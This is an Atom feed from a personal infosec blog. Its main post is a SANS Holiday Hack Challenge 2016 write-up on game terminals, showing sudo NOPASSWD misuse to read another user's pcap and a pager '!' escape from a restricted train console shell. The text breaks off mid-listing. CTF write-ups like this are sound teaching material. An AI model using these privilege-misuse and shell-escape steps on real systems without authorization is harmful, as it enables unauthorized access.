<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://www.joshtomkiel.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.joshtomkiel.com/" rel="alternate" type="text/html" /><updated>2018-05-29T10:19:29-07:00</updated><id>https://www.joshtomkiel.com/</id><title type="html">josh@blog:~$ cat README.txt</title><subtitle>Another infosec blog</subtitle><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><entry><title type="html">Research Project 1</title><link href="https://www.joshtomkiel.com/research/research-project1-2018/" rel="alternate" type="text/html" title="Research Project 1" /><published>2018-05-28T00:00:00-07:00</published><updated>2018-05-28T04:50:46-07:00</updated><id>https://www.joshtomkiel.com/research/research-project1-2018</id><content type="html" xml:base="https://www.joshtomkiel.com/research/research-project1-2018/">&lt;p&gt;Coming soon…&lt;/p&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">Coming soon...</summary></entry><entry><title type="html">Terminals</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-terminals-2016/" rel="alternate" type="text/html" title="Terminals" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-terminals-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-terminals-2016/">&lt;h3 id=&quot;there-are-a-total-of-five-5-terminals-that-you-can-interact-with-while-playing-the-quest&quot;&gt;There are a total of five (5) terminals that you can interact with while playing the &lt;a href=&quot;https://quest2016.holidayhackchallenge.com&quot;&gt;Quest&lt;/a&gt;.&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal0_welcome.png&quot; alt=&quot;terminal_icon&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This year, the &lt;a href=&quot;https://www.holidayhackchallenge.com/2016/&quot;&gt;SANS Holiday Hack Challenge&lt;/a&gt; included in game “terminals.” After collecting the parts below to build a Cranberry Pi and talking with the elf, Holly Evergreen, you can interact with the terminals.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;SD Card&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Pi Board&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;HDMI Cord&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Heatsink&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Power Cord&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;img src=&quot;/assets/images/sans2016/sd_card.png&quot; alt=&quot;sd_card&quot; /&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/images/sans2016/pi_board.png&quot; alt=&quot;pi_board&quot; /&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;img src=&quot;/assets/images/sans2016/hdmi.png&quot; alt=&quot;hdmi&quot; /&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;img src=&quot;/assets/images/sans2016/heatsink.png&quot; alt=&quot;heatsink&quot; /&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;img src=&quot;/assets/images/sans2016/power_cord.png&quot; alt=&quot;power&quot; /&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;To interact with a terminal, simply walk up to one of these &lt;img src=&quot;/assets/images/sans2016/terminal_icon.png&quot; alt=&quot;terminal_icon&quot; /&gt; icons in the game.  You will be greeted with a command prompt on your own private &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; container. This feature was awesome!  Each terminal presented its own challenge. Without further ado, let me walk you through how I completed each one.&lt;/p&gt;

&lt;h2 id=&quot;tcpdump-challenge&quot;&gt;Tcpdump Challenge&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal_pcap_room.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-objective-get-both-parts-of-the-passphrase&quot;&gt;Challenge Objective: Get Both Parts of the Passphrase&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*To&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;open the door, find both parts of the passphrase inside the /out.pcap file*&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look at the default directory I was are placed in.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;ls -la&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;total 1136&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  46 root  root     4096 Dec 31 19:55 .&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  46 root  root     4096 Dec 31 19:55 ..&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 root  root        0 Dec 31 19:55 .dockerenv&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Dec  1 21:18 bin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Sep 12 04:09 boot&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   5 root  root      380 Dec 31 19:55 dev&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  46 root  root     4096 Dec 31 19:55 etc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   5 root  root     4096 Dec  7 20:22 home&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  10 root  root     4096 Dec  1 21:18 lib&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:29 lib64&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:28 media&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:28 mnt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:28 opt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-r--------   1 itchy itchy 1087929 Dec  2 15:05 out.pcap&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;dr-xr-xr-x 370 root  root        0 Dec 31 19:55 proc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwx------   2 root  root     4096 Nov  4 18:28 root&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   3 root  root     4096 Nov  4 18:28 run&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:30 sbin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 root  root     4096 Nov  4 18:28 srv&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;dr-xr-xr-x  13 root  root        0 Dec 14 14:13 sys&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxrwxrwt   2 root  root     4096 Dec  7 20:22 tmp&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  15 root  root     4096 Dec  1 21:18 usr&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  17 root  root     4096 Dec  2 15:13 var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;highlighter-rouge&quot;&gt;out.pcap&lt;/code&gt; is visible but it is owned by user “itchy”.  Our current user is “scratchy” and “scratchy” does not have rights to access it.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command will come in handy here.  I don’t know the passwords for either account but let’s see what other options there are with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sudo -h&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sudo - execute a command as another user&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sudo -h | -K | -k | -V&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;[-u user] [VAR=value] [-i|-s] [&amp;lt;command&amp;gt;]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;[-u user] file ...&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Options&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-A, --askpass               use a helper program for password prompting&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-b, --background            run command in the background&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-C, --close-from=num        close all file descriptors &amp;gt;= num&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-E, --preserve-env          preserve user environment when running command&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-e, --edit                  edit files instead of running a command&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-g, --group=group           run command as the specified group name or ID&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-H, --set-home              set HOME variable to target user's home dir&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-h, --help                  display help message and exit&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-h, --host=host             run command on host (if supported by plugin)&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-i, --login                 run login shell as the target user; a command may also be&lt;/span&gt;
                              &lt;span class=&quot;s&quot;&gt;specified&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-K, --remove-timestamp      remove timestamp file completely&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-k, --reset-timestamp       invalidate timestamp file&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-l, --list                  list user's privileges or check a specific command; use&lt;/span&gt;
                              &lt;span class=&quot;s&quot;&gt;twice for longer format&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-n, --non-interactive       non-interactive mode, no prompts are used&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-P, --preserve-groups       preserve group vector instead of setting to target's&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-p, --prompt=prompt         use the specified password prompt&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-r, --role=role             create SELinux security context with specified role&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-S, --stdin                 read password from standard input&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-s, --shell                 run shell as the target user; a command may also be&lt;/span&gt;
                              &lt;span class=&quot;s&quot;&gt;specified&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-t, --type=type             create SELinux security context with specified type&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-U, --other-user=user       in list mode, display privileges for user&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-u, --user=user             run command (or edit file) as specified user name or ID&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-V, --version               display version information and exit&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-v, --validate              update user's timestamp without running a command&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;--                          stop processing command line arguments&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s see if I can list the privileges that our current user (scratchy) has.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sudo -l -U scratchy&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unable to resolve host fd1441e110fc&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Matching Defaults entries for scratchy on fd1441e110fc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;env_reset, mail_badpass,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;User scratchy may run the following commands on fd1441e110fc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;(itchy) NOPASSWD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/usr/sbin/tcpdump&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;(itchy) NOPASSWD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/usr/bin/strings&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The NOPASSWD setting is not great for security as it allows the command to be run without prompting for a password and it runs with the permissions of the owner.  In this case I can run a &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command as “itchy” and have that account read the pcap with &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt;.  First, start by telling &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; to output in ASCII (-A) and read from a file (-r) then finally greping through that output to match words containing “part.” I chose to first look for “part” because the welcome banner said “&lt;strong&gt;find both parts&lt;/strong&gt; of the passphrase inside the /out.pcap file.”&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sudo -u itchy tcpdump -A -r out.pcap | grep 'part'&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unable to resolve host fd1441e110fc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;reading from file out.pcap, link-type EN10MB (Ethernet)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt; input type=&quot;hidden&quot; name=&quot;part1&quot; value=&quot;santasli&quot; /&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nailed it.  Part 1 of the passphrase is &lt;code class=&quot;highlighter-rouge&quot;&gt;santasli&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Part 2 can be found using &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; command.  However, just running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; will not show the answer.  Let’s take a look at what options &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; has.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;strings -h&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strings [option(s)] [file(s)]&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;Display printable strings in [file(s)] (stdin by default)&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;The options are&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-a - --all                Scan the entire file, not just the data section [default]&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-d --data                 Only scan the data sections in the file&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-f --print-file-name      Print the name of the file before each string&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-n --bytes=[number]       Locate &amp;amp; print any NUL-terminated sequence of at&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-&amp;lt;number&amp;gt;                   least [number] characters (default 4).&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-t --radix={o,d,x}        Print the location of the string in base 8, 10 or 16&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-w --include-all-whitespace Include all whitespace as valid string characters&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-o                        An alias for --radix=o&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-T --target=&amp;lt;BFDNAME&amp;gt;     Specify the binary file format&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-e --encoding={s,S,b,l,B,L} Select character size and endianness&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
                            &lt;span class=&quot;s&quot;&gt;s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;file&amp;gt;                   Read options from &amp;lt;file&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-h --help                 Display this information&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;-v -V --version           Print the program's version number&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;supported targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-linux pei-i3&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;86 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Report bugs to &amp;lt; http://www.sourceware.org/bugzilla/ &amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By specifying the encoding character size as 16-bit (-el) the cleartext passphase for Part 2 can be seen!&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sudo -u itchy strings -el out.pcap&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unable to resolve host fd1441e110fc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;part2:ttlehelper&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Complete passphase:  &lt;code class=&quot;highlighter-rouge&quot;&gt;santaslittlehelper&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The two user accounts were “itchy” and “scratchy”, it’s nice to see that they kept with &lt;a href=&quot;https://en.wikipedia.org/wiki/The_Simpsons&quot;&gt;The Simpsons&lt;/a&gt; theme…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/Coin_tcpdump.png&quot; alt=&quot;challenge_coin&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outatime-challenge&quot;&gt;OUTATIME Challenge&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal_outtatime.png&quot; alt=&quot;terminal&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-objective--ride-the-train&quot;&gt;Challenge Objective:  Ride the Train&lt;/h3&gt;

&lt;p&gt;I had the most fun with this challenge.  The terminal opens to a preconfigured menu with limited options.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;Train Management Console&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;AUTHORIZED USERS ONLY&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;==== MAIN MENU ====&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;STATUS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                         &lt;span class=&quot;s&quot;&gt;Train Status&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;BRAKEON&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                        &lt;span class=&quot;s&quot;&gt;Set Brakes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;BRAKEOFF&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                       &lt;span class=&quot;s&quot;&gt;Release Brakes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;START&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                          &lt;span class=&quot;s&quot;&gt;Start Train&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;HELP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                           &lt;span class=&quot;s&quot;&gt;Open the help document&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;QUIT&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                           &lt;span class=&quot;s&quot;&gt;Exit console&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;menu:main&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Type &lt;code class=&quot;highlighter-rouge&quot;&gt;HELP&lt;/code&gt; and press enter.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;Help Document for the Train&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;*STATUS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;option will show you the current state of the train (brakes, boiler, boiler temp, coal level)&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;*BRAKEON&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;option enables the brakes.  Brakes should be enabled at every stop and while the train is not in use.&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;*BRAKEOFF&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;option disables the brakes.  Brakes must be disabled before the **START** command will execute.&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;*START&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;option will start the train if the brake is released and the user has the correct password.&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;*HELP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;brings you to this file.  If it's not here, this console cannot do it, unLESS you know something I don't.&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Just in case you wanted to know, here's a really good Cranberry pie recipe&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Ingredients&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1 recipe pastry for a 9 inch double crust pie&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1 1/2 cups white sugar&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1/3 cup all-purpose flour&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1/4 teaspoon salt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1/2 cup water&lt;/span&gt; 
&lt;span class=&quot;s&quot;&gt;1 (12 ounce) package fresh cranberries&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1/4 cup lemon juice&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1 dash ground cinnamon&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;2 teaspoons butter&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Seeing the &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; at the bottom of the file immediately reminded me of a past SANS blog post about &lt;a href=&quot;https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells&quot;&gt;Escaping Restricted Linux Shells&lt;/a&gt;.  To escape this and access a shell prompt, simply put an exclamation mark (&lt;code class=&quot;highlighter-rouge&quot;&gt;!&lt;/code&gt;) and press enter.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;Train Management Console&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;AUTHORIZED USERS ONLY&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;==== MAIN MENU ====&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;STATUS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                         &lt;span class=&quot;s&quot;&gt;Train Status&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;BRAKEON&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                        &lt;span class=&quot;s&quot;&gt;Set Brakes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;BRAKEOFF&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                       &lt;span class=&quot;s&quot;&gt;Release Brakes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;START&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                          &lt;span class=&quot;s&quot;&gt;Start Train&lt;/span&gt;
